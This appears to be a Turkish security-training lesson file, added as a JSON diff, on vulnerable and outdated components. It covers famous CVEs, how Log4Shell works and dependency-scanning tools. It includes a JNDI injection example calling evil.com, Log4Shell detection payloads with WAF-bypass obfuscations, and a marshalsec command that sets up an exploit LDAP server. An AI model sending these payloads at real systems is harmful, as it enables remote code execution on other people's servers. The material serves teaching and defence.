@@ -1,0 +1,90 @@
+{
+  "id": "vulnerable-components",
+  "slug": "vulnerable-components",
+  "title": "A06 — Vulnerable & Outdated Components",
+  "subtitle": "Güvenlik Açıklı ve Eski Bileşenler",
+  "description": "Eski kütüphane versiyonları, Log4Shell, Spring4Shell, CVE istismarı, bağımlılık zinciri saldırıları.",
+  "icon": "📦",
+  "order": 6,
+  "tags": ["CVE", "Log4Shell", "Spring4Shell", "dependency", "supply chain", "npm audit", "trivy"],
+  "modules": [
+    {
+      "id": "vuln-components-intro",
+      "title": "Zafiyetli Bileşen Riski",
+      "description": "Neden bileşen güvenliği kritik? Gerçek ihlal örnekleri",
+      "difficulty": "beginner",
+      "duration": "15 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Bileşen Güvenliği",
+          "content": "**Modern uygulama = %20 kendi kod + %80 açık kaynak kütüphane**\n\nBir kütüphanede zafiyet → tüm uygulamalar etkilenir.\n\n**Tarihin En Büyük Bileşen Zafiyetleri:**\n\n| CVE | Bileşen | Etki | Skor |\n|-----|---------|------|------|\n| CVE-2021-44228 | Log4j (Log4Shell) | RCE — milyonlarca Java uygulaması | 10/10 |\n| CVE-2022-22965 | Spring Framework (Spring4Shell) | RCE | 9.8/10 |\n| CVE-2021-26084 | Confluence | RCE | 9.8/10 |\n| CVE-2017-5638 | Apache Struts (Equifax) | RCE → 147M kişi | 10/10 |\n| CVE-2021-21972 | VMware vCenter | RCE | 9.8/10 |\n\n**Supply Chain Saldırısı:**\n- Geliştiricinin bağımlılığına zararlı kod ekleme\n- **2020 SolarWinds:** Build pipeline'a trojan → 18.000 müşteriye dağıtıldı\n- **2021 Codecov:** CI/CD script'i değiştirildi → secret sızdı\n- **2022 node-ipc:** Anti-war protesto kodu"
+        }
+      ]
+    },
+    {
+      "id": "log4shell",
+      "title": "Log4Shell — CVE-2021-44228",
+      "description": "Tarihin en etkili zafiyeti — JNDI injection ile RCE",
+      "difficulty": "intermediate",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Log4Shell Nasıl Çalışır?",
+          "content": "**Log4Shell:** Apache Log4j 2.x kütüphanesi JNDI lookup özelliği — log edilen bir string içindeki `${jndi:ldap://...}` ifadesini otomatik olarak değerlendirir.\n\n**Saldırı Zinciri:**\n1. Saldırgan, kullanıcı adı alanına `${jndi:ldap://evil.com/exploit}` yazar\n2. Uygulama bunu log'a yazmaya çalışır\n3. Log4j LDAP lookup yapar → evil.com sunucusuna bağlanır\n4. Sunucu zararlı Java class döner\n5. Uygulama class'ı deserialize eder → RCE!\n\n**Etkilenen Yazılımlar:** Minecraft, Steam, iCloud, Twitter, Amazon, VMware...\n\n**Versiyon:** Log4j 2.0-beta9 → 2.14.1 (düzeltme: 2.17.1)"
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Log4Shell Tespiti ve Test",
+          "commands": [
+            {
+              "command": "# Log4Shell tespit payload'ı:\n# User-Agent, X-Forwarded-For, username, email — her log edilen alana dene:\n${jndi:ldap://BURP_COLLABORATOR.burpcollaborator.net/a}\n${jndi:dns://BURP_COLLABORATOR.burpcollaborator.net/a}\n\n# Farklı protokoller:\n${jndi:ldaps://...}\n${jndi:rmi://...}\n${jndi:iiop://...}\n\n# WAF bypass:\n${${lower:j}ndi:...}\n${${::-j}${::-n}${::-d}${::-i}:...}\n${j${::-n}di:ldap://...}\n${jndi:${lower:l}${lower:d}a${lower:p}://...}",
+              "description": "Log4Shell tespit payload'ları ve WAF bypass",
+              "tip": "Burp Collaborator URL kullanarak out-of-band tespiti yap — görünür response olmasa da callback gelir"
+            },
+            {
+              "command": "# Log4Shell scanner:\n# log4j-scan:\npip install log4j-scan\nlog4j-scan -u https://hedef.com\n\n# nuclei ile:\nnuclei -u https://hedef.com -t cves/2021/CVE-2021-44228.yaml\n\n# Kendi exploit LDAP sunucusunu kur (lab):\n# marshalsec LDAP redirect server:\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://SENIN_IP:8888/#Exploit\"",
+              "description": "Log4Shell tarama araçları ve exploit lab kurulumu"
+            },
+            {
+              "command": "# Sistemde Log4j versiyonunu bul:\n# Java uygulamasında:\nfind / -name 'log4j*.jar' 2>/dev/null\nfind / -name '*.jar' 2>/dev/null | xargs -I{} sh -c 'jar tf \"{}\" 2>/dev/null | grep -q JndiLookup && echo \"Zafiyetli: {}\"'\n\n# Docker image tarama (trivy):\ntrivy image myapp:latest | grep -i log4j\n\n# Maven dependency kontrolü:\nmvn dependency:tree | grep log4j",
+              "description": "Sistemde Log4j versiyonu ve zafiyet tespiti"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "dependency-scanning",
+      "title": "Bağımlılık Güvenlik Taraması",
+      "description": "npm audit, trivy, OWASP Dependency Check ile zafiyetli kütüphane tespiti",
+      "difficulty": "intermediate",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Otomatik Bağımlılık Taraması",
+          "commands": [
+            {
+              "command": "# npm (Node.js) bağımlılık güvenlik taraması:\nnpm audit\nnpm audit fix        # otomatik düzelt\nnpm audit fix --force # major versiyon da yükselt\n\n# Belirli zafiyetleri göster:\nnpm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity == \"critical\")'\n\n# pip (Python):\npip install safety\nsafety check\nsafety check -r requirements.txt",
+              "description": "npm audit ve pip-safety ile bağımlılık taraması"
+            },
+            {
+              "command": "# OWASP Dependency-Check:\n# Java/Python/Node/Ruby projeleri için:\ndependency-check --project \"Proje Adı\" \\\n  --scan /proje/dizini \\\n  --format HTML \\\n  --out /rapor/dizini\n\n# Docker image güvenlik taraması (trivy):\ntrivy image nginx:latest\ntrivy image --severity CRITICAL,HIGH myapp:v1.0\n\n# Grype (Anchore):\ngrype myapp:latest\ngrype dir:/proje/dizini",
+              "description": "OWASP Dependency-Check, Trivy ve Grype ile kapsamlı tarama"
+            },
+            {
+              "command": "# CVE veritabanı araştırma:\n# NVD (National Vulnerability Database):\ncurl 'https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=log4j' \\\n  | jq '.vulnerabilities[].cve | {id: .id, score: .metrics.cvssMetricV31[].cvssData.baseScore, desc: .descriptions[0].value[:100]}'\n\n# searchsploit ile exploit ara:\nsearchsploit log4j\nsearchsploit apache struts\nsearchsploit --json CVE-2021-44228",
+              "description": "CVE veritabanı ve searchsploit ile exploit arama"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
